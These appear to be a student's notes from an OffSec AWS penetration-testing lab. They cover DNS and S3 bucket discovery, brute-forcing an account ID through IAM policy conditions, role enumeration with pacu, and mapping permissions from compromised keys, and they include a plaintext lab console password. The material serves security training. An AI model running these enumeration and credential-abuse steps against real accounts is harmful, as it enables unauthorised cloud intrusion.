# Lab Information  
- Public DNS IP Address
- Domain name of the target
- Credentials for the IAM user attacker
  - ACCESS_KEY_ID
  - SECRET_ACCESS_KEY
 
# Setup  
- add a new nameserver line
  sudo nano /etc/resolv.conf
  ```
  # Generated by NetworkManager
  nameserver 44.223.23.191 //offsec Lab - DNS IP
  nameserver 8.8.8.8

  sudo chattr +i /etc/resolv.conf
  sudo chattr -i /etc/resolv.conf (reversable)

  sudo service NetworkManager restart
  ```
- Testing DNS config  
  `kali@kali:~$ host www.offseclab.io 44.205.254.229`  
  `kali@kali:~$ host www.offseclab.io`  
- Resetting the DNS Settings
  `kali@kali:~$ sudo systemctl restart NetworkManager`  

# Recon cloud resource on the internet  
- Querying Nameserver Records of offseclab.io Domain  
  `kali@kali:~$ host -t ns offseclab.io`  
  offseclab.io name server ns-1536.awsdns-00.co.uk.  
  offseclab.io name server ns-512.awsdns-00.net.  
- Getting the Registrar Information of awsdns-00.com Domain  
  `kali@kali:~$ whois awsdns-00.com | grep "Registrant Organization"` //Registrant Organization: Amazon Technologies, Inc.
- Getting the Public IP address of www.offseclab.io  
  `kali@kali:~$ host www.offseclab.io`  // www.offseclab.io has address 52.70.117.69  
- Getting Details of the Public IP Address of the Website  
  `kali@kali:~$ host 52.70.117.69`  //69.117.70.52.in-addr.arpa domain name pointer ec2-52-70-117-69.compute-1.amazonaws.com  
  `kali@kali:~$ whois 52.70.117.69 | grep "OrgName"`  //OrgName:        Amazon Technologies Inc.  
- Learn: **resource hosted in AWS (amazonaws.com), and Amazon Elastic Compute Cloud (Amazon EC2) instance**.  
- Using **dnsenum** to Automate DNS Reconnaissance of offseclab.io Domain  
  `kali@kali:~$ dnsenum offseclab.io --threads 100`
- Learn: likely AWS Route53 service, EC2 service, public IP serves several websites (www.offseclab.io)  
- `host -t ns offseclab.io`: query the authoritative DNS servers for the domain offseclab.io  
- Amazon Route 53 manage the offseclab.io domain  
- `host -t TXT offseclab.io`  
- browse http://www.offseclab.io, inspect browser network:https://s3.amazonaws.com/offseclab-assets-public-vvxepolu/sites/www/images/saphire.jpg. Stored in AWS S3 bucket  
- S3 bucket name is: offseclab-assets-public-axevtewi. Object key is: sites/www/images/saphire.jpg.  
- List the content of the bucket: https://s3.amazonaws.com/offseclab-assets-public-vvxepolu/ 
- Guest naming convention: https://s3.amazonaws.com/offseclab-assets-private-vvxepolu/  
- Updating the Packages and Installing **cloud-enum** in Kali Linux  
  `sudo apt install cloud-enum`  
- Running Quick Scan Against offseclab-assets-public-axevtewi Bucket Using cloud_enum in AWS  
  `cloud_enum -k offseclab-assets-public-axevtewi --quickscan --disable-azure --disable-gcp`
- Making a Dictionary of Keywords to Search S3 Bucket  
  `for key in "public" "private" "dev" "prod" "development" "production"; do echo "offseclab-assets-$key-axevtewi"; done | tee /tmp/keyfile.txt`
  ```
  offseclab-assets-public-axevtewi
  offseclab-assets-private-axevtewi
  offseclab-assets-dev-axevtewi
  offseclab-assets-prod-axevtewi
  offseclab-assets-development-axevtewi
  offseclab-assets-production-axevtewi
  ```
- Running cloud_enum Against The Generated keyfile.txt File  
  `cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp`
- Custom URLs of All the Three Major CSPs:s3.amazonaws.comï¼Œawsapps.com  

# Recon via CSP API  
- Installing AWS CLI in Kali Linux  
  `sudo apt install -y awscli`
- Configuring Profile and Validating Communication with AWS API  
  `aws configure --profile attacker`  
  `aws --profile attacker sts get-caller-identity`
  
- Obtain Information from Publicly Shared Resources  
  - Listing All Public AMIs Owned by Amazon AWS  
    `aws --profile attacker ec2 describe-images --owners amazon --executable-users all`  
  - The Filter Expression Format  
    `--filters "Name=filter-name,Values=filter-value1,filter-value2,..."`  
    `--filters "Name=description,Values=*Offseclab*"`  
    `aws --profile attacker ec2 describe-images --executable-users all --filters "Name=description,Values=*Offseclab*"`  //no image  
    `aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Offseclab*"`  
  - Listing Public Snapshots After Filtering the List Using the Keyword "description"  
    `aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*offseclab*"`  
  - Use the attacker's account ID to search for other publicly shared resources. You will find a 1 GB-sized snapshot (VoumeSize: 1)  
    `aws --profile attacker ec2 describe-snapshots --owner-ids $accountID --filter 'Name=volume-size,Values=1' --query 'Snapshots[].Description'`  
- Obtain account IDs From Public S3 Buckets  
  - locate a publicly readable bucket or object  
  - create a policy and attach it to the attacker's IAM user  
  - try listing the bucket with the Enum user credential  
  - update the policy and try listing the bucket again  
  - try listing the bucket with the Enum user credential  
  - keep updating the policy untill all accountID's digits are discovered  

  - Getting the Name of the Public Bucket with curl  
    `curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'`  //offseclab-assets-public-kaykoour  
  - Listing the Public Bucket as the attacker  
    `aws --profile attacker s3 ls offseclab-assets-public-kaykoour`  //PRE sites/  
  - Creating the IAM User "enum" and Generating AccessKeyId and SecretAccessKey for that User  
    `aws --profile attacker iam create-user --user-name enum`  
    `aws --profile attacker iam create-access-key --user-name enum`  
  - Configuring AWS CLI with Profile "enum"  
    `Configuring AWS CLI with Profile "enum"`
  - Listing the Private Bucket with the enum User  
    `aws --profile enum s3 ls offseclab-assets-private-kaykoour`  //AccessDenied
  - Policy to Allow Listing Buckets and Reading Objects  
    nano policy-s3-read.json  
    ```
    {
     "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {"s3:ResourceAccount": ["0*"]}
            }
        }
      ]
    }
    ```
  - Attaching the s3-read Inline Policy to the enum IAM User  
    ```
    aws --profile attacker iam put-user-policy \
    --user-name enum \
    --policy-name s3-read \
    --policy-document file://policy-s3-read.json

    aws --profile attacker iam list-user-policies --user-name enum  
    ```
  - user will be able to read the content of the bucket only if the account ID where the bucket resides starts with "0"  
  - Modifying the Policy Condition Statement to Brute Force the AccountID  
    ```
    - __"StringLike": {"s3:ResourceAccount": ["10*"]}__
    - __"StringLike": {"s3:ResourceAccount": ["11*"]}__
    ```
  - [s3-account-search](https://github.com/WeAreCloudar/s3-account-search)  
- Enumerate IAM Users in Other Accounts  
  - Creating a S3 Bucket in the attacker's Account  
    `aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM`
  - Policy Granting Permission to List the Bucket to a Single IAM User  
    nano grant-s3-bucket-read.json  
    ```
    {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
            },
            "Action": "s3:ListBucket"

        }
      ]
    }
    ```
  - Attaching the Resource Based Policy to the Test Bucket  
    `aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read.json`
  - create a new policy that grant privileges to a nonexistent principal  
    nano grant-s3-bucket-read-userDoNotExist.json  
    ```
    "AWS": ["arn:aws:iam::123456789012:user/nonexistant"]
     aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328  --policy file://grant-s3-bucket-read-userDoNotExist.json //Invalid principal in policy    
    ```
  - When we tried to attach a resource-based policy to a bucket granting permissions to a Principal that does not exist, it returns an error message stating 'Invalid principal in policy'.  Automate this process to obtain a valid enumeration techqniue that will indicate whether a Principal exists.  
  - Creating a List of Roles to Search in the Account  
    ```
    echo -n "lab_admin
    security_auditor
    content_creator
    student_access
    lab_builder
    instructor
    network_config
    monitoring_logging
    backup_restore
    content_editor" > /tmp/role-names.txt
    ```
  - Installing pacu in Kali Linux Using the Package Manager  
    `sudo apt install pacu`
  - Starting pacu in Interactive Mode  
    `pacu` 
  - Importing the attacker Profile Credentials in pacu  
    `Pacu (offseclab:No Keys Set) > import_keys attacker`  //Imported keys as "imported-attacker"  
  - Listing Modules in pacu  
    `Pacu (offseclab:imported-attacker) > ls`  
    `Pacu (offseclab:imported-attacker) > help iam__enum_roles`  
  - Running the enum_roles Module in pacu  
    `run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012`  //Successfully assumed role for 1 hour: arn:aws:iam::562581731380:role/lab_admin
  - Assume the role and list all available VPCs using the role privileges
    ```
    export AWS_ACCESS_KEY_ID="ASIAXXXXXXX"
    export AWS_SECRET_ACCESS_KEY="XXXXXXXXXXXX"
    export AWS_SESSION_TOKEN="XXXXXXXXXXXX"

    aws ec2 describe-vpcs \
    --region us-east-1 \
    --query 'Vpcs[*].{VpcId:VpcId,Tags:Tags}' \
    --output table
    ```

# IAM Recon  
Focus: gathering initial information from the compromised credentials, including understanding the scope of access within the AWS environment  
The **target user** will simulate the compromised access to the cloud environment.  
The **challenge user** is an auxiliary user with very limited access that we'll use to test concepts and execute additional tasks  
The **monitor user** will simulate an operator with access to Cloudtrail, the AWS logging service  

```
Credentials access as the target user.
Target ACCESS KEY ID: 
Target SECRET ACCESS KEY: 

Credentials access as the challenge user.
Challenge ACCESS KEY ID: 
Challenge SECRET ACCESS KEY: 

Credentials to access as the monitor user.
Management Console login URL: https://466673965627.signin.aws.amazon.com/console
Username: monitoring
Password: I1Q_#n*O[3Rg4m!il351
```

- examining compromised credentials
  - Configuring AWS CLI with profiles
    ```
    kali@kali:~$ aws configure --profile target
    AWS Access Key ID []: AKIAVXWRNA7HUYFERLHS...
    AWS Secret Access Key []: u1CmqAO9QR...
    Default region name []: us-east-1
    Default output format []: json
    ```
  - Getting details from the compromised credentials by running get-caller-identity.
    `aws --profile target sts get-caller-identity` //Account, Arn user
    ```
    {
    "UserId": "AIDAQOMAIGYUYNMOIF46I",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/support/clouddesk-plove"
    }
    ```
  - Getting the account ID from access keys with the get-access-key-info command.  
    `aws configure --profile challenge` //AWS Access Key ID []: AKIAVXW...  
    `aws --profile challenge sts get-access-key-info --access-key-id AKIAQOMAIGYUVEHJ7WXM`  // "Account": "123456789012"  
  - Getting information from error messages  
    `aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile`
    User: arn:aws:iam::123456789012:user/support/clouddesk-plove is not authorized to perform...  
  - On the cloudtrail page --> Event History  
  - As an attacker, use the compromise credentials to check if these events are recorded.  
    `aws --profile target sts get-caller-identity --region us-east-2` //Executing an API request to another region  
  - Switch to us-east-2 region. Event name: GetCallerIdentity. Logs only appear in us-east-2 
- scoping IAM permissions
  - **Inline Policies** are directly linked to a single identity and exist only in that identity space  
  - **Managed Policies** stand as distinct, reusable policies that can be associated with multiple identities  
  - Listing inline and managed policies associated with an IAM user  
    `aws --profile target iam list-user-policies --user-name clouddesk-plove`  
    `aws --profile target iam list-attached-user-policies --user-name clouddesk-plove`  //  "PolicyArn": "arn:aws:iam::123456789012:policy/deny_challenges_access"
  - Listing the groups to which the user belongs.  
    `aws --profile target iam list-groups-for-user --user-name clouddesk-plove` //support  
  - Listing inline and managed policies associated with an IAM group  
    `aws --profile target iam list-group-policies --group-name support`
    `aws --profile target iam list-attached-group-policies --group-name support`  //  "PolicyArn": "arn:aws:iam::aws:policy/job-function/SupportUser"
  - Listing a policy version  
    `aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"` //v9  
  - Listing a policy definition by its version  
    `aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v9`
  - Use the challenge profile to scope the level of actions allowed to run in the EC2 service. Run the permitted actions to list or describe resources. Find the tag key "proof".  
    `aws --profile challenge ec2 describe-vpcs`
  
# IAM resource Enumeration  
**Compromised credentials**  
- User: arn:aws:iam::123456789012:user/support/clouddesk-plove
- Group: arn:aws:iam::123456789012:group/support/support
- Policy: arn:aws:iam::aws:policy/job-function/SupportUser

**Enumerating IAM resources**
- Getting the permissions related to IAM service of the SupportUser policy  
  `aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8 | grep "iam"`  //get*, list*
- Getting available IAM subcommands  
  `aws --profile target iam help | grep -E "list-|get-|generate-"`
- Getting the IAM Account Summary  
  `aws --profile target iam get-account-summary | tee account-summary.json`
- Listing IAM identities
  `aws --profile target iam list-users | tee  users.json`  
  `aws --profile target iam list-groups | tee groups.json`  
  `aws --profile target iam list-roles | tee roles.json`
- Listing policies (--scope Local to display only the Customer Managed Policies and omit the AWS Managed Policies)  
  `aws --profile target iam list-policies --scope Local --only-attached | tee policies.json`  
- Inline policies
  ```
  list-user-policies
  get-user-policy
  list-group-policies
  get-group-policy
  list-role-policies
  get-role-policy
  ```
- Managed policies
  ```
  list-attached-user-policies
  list-attached-group-policies
  list-attached-role-policies
  ```
- Retrieving a snapshot of the IAM configuration with the get-account-authorization-details subcommand    
  `aws --profile target iam get-account-authorization-details --filter User Group LocalManagedPolicy Role | tee account-authorization-details.json`  
- Listing the managed policies of the clouddesk-plove IAM user  
  `aws --profile target iam list-attached-user-policies --user-name clouddesk-plove`     
- Getting an AccessDenied error when trying to list the policy versions of the deny_challenges_access policy     
  `aws --profile target iam list-policy-versions --policy-arn arn:aws:iam::12345678912:policy/deny_challenges_access`  
- Getting the list of policy versions from the output of the get-account-authorization-details command     
  `aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy`  

**Processing API response data with JMESPath**  
- Running get-account-authorization-details subcommand to get all IAM users information  
  `aws --profile target iam get-account-authorization-details --filter User` // "UserName": "admin-alice"  
- Querying the UserName key from the JSON document  
  `aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[].UserName"`  
- Quering for more than one key values  
  `aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].[UserName,Path,GroupList]"`  
  `aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].{Name: UserName,Path: Path,Groups: GroupList}"`  
- Filtering all IAM Users whose names contain admin  
  `aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}"`  
- Constructing more advanced queries  
  `aws --profile target iam get-account-authorization-details --filter User Group --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"`
  ```
    {
     "Users": [
         "admin-alice"
     ],
     "Groups": [
         {
             "Name": "admin"
         }
     ]
  }
  ```
- What JMESPath expression will filter and display all users that contain the word "admin" in the Username and the Path fields?  
  `?contains(UserName,'admin') && contains(Path,'admin')`
  
**Running Automated Enumeration with Pacu**     
```
kali@kali:~$ pacu
What would you like to name this new session? enumlab
Pacu (enumlab:No Keys Set) > import_keys target

Pacu (enumlab:imported-target) > help iam__enum_users_roles_policies_groups
```

- IAM resources saved in Pacu database.  
  `run iam__enum_users_roles_policies_groups`  
- Reviewing the data collected in Pacu
  ```
  Pacu (enumlab:imported-target) > services
  Pacu (enumlab:imported-target) > data IAM
  ```
  
**Extrating insights from enumeration data**  
- Getting the "admin-alice" IAM user details> username, group admin, tag keys, empty policies  
  `aws --profile target iam get-account-authorization-details --filter User Group --query "UserDetailList[?UserName=='admin-alice']"`  
- Getting the "admin" and "amethyst_admin" User Groups details  
  `aws --profile target iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='admin']"`  
   //"PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"  
  `aws --profile target iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='amethyst_admin']"`  
  //"PolicyArn": "arn:aws:iam::123456789012:policy/amethyst/amethyst_admin"  
- Analyzing the [AdminitratorAccess Policy](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/AdministratorAccess.html) Document  
- Getting the "amethyst_admin" policy statements  
  `aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy --query "Policies[?PolicyName=='amethyst_admin']"`  
- [Cloudmapper](https://github.com/duo-labs/cloudmapper) provides visual representations of AWS configurations
- To find IAM users whose policies contain a wildcard * that could lead to privilege escalation  
  `aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?UserPolicyList[?contains(PolicyDocument.Statement[].Action, '*')] || AttachedManagedPolicies[?PolicyName!=null]].UserName"`  
